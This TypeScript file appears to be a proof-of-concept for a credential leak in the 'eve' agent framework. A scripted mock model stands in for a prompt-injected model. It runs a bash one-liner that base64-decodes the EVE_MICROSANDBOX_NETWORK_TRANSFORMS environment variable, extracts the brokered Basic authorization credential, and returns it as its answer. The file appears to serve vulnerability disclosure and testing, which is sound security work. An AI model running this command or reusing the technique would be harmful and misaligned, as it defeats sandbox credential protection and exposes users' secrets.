import { defineAgent } from "eve";
import { mockModel } from "eve/evals";

// A stand-in for a prompt-injected / malicious model — no real provider and no
// API key. `defineAgent({ model })` accepts any AI SDK LanguageModel
// (https://eve.dev/docs/agent-config#set-the-model); eve's own `mockModel`
// gives a deterministic offline one.
//
// Turn 1: it calls the built-in `bash` tool with the exact one-liner an
//         attacker-controlled model would run.
// Turn 2: the brokered secret is now in the tool result, so it exfiltrates the
//         recovered plaintext as its final answer.
//
// This exercises the real model -> `bash` -> MicrosandboxVm.spawn path
// (bash-tool.ts -> sandbox.run -> spawn), which injects
// EVE_MICROSANDBOX_NETWORK_TRANSFORMS into the guest env.
const LEAK_COMMAND = 'echo "$EVE_MICROSANDBOX_NETWORK_TRANSFORMS" | base64 -d';

export default defineAgent({
  // Mock model ids aren't in the AI Gateway catalog, so eve can't look up the
  // context window it needs to compile compaction. This escape hatch supplies it
  // (https://eve.dev/docs/agent-config) so `eve dev` boots offline.
  modelContextWindowTokens: 200_000,
  model: mockModel(({ toolResults }) => {
    const bash = toolResults.find((result) => result.name === "bash");

    // Turn 1 — no bash result yet: run the leak command via the built-in tool.
    if (bash === undefined) {
      return { toolCalls: [{ name: "bash", input: { command: LEAK_COMMAND } }] };
    }

    // Turn 2 — the secret came back in the tool result. Exfiltrate it.
    const output = bash.output as { stdout?: unknown } | string;
    const stdout = (typeof output === "string" ? output : String(output.stdout ?? "")).trim();

    let recovered = "(could not parse)";
    try {
      const auth = JSON.parse(stdout)[0]?.headers?.authorization ?? "";
      recovered = Buffer.from(auth.replace(/^Basic\s+/i, ""), "base64").toString("utf8");
    } catch {
      // leave the default
    }

    console.log("\n===== eve credential-brokering leak (exfiltrated by the model via bash) =====");
    console.log("bash stdout ($EVE_MICROSANDBOX_NETWORK_TRANSFORMS | base64 -d):");
    console.log("  " + stdout);
    console.log("recovered plaintext brokered credential:");
    console.log("  " + recovered);
    console.log("=============================================================================");
    console.log("LEAK>>>" + stdout + "<<<LEAK");

    return { text: `Recovered brokered credential: ${recovered}` };
  }),
});
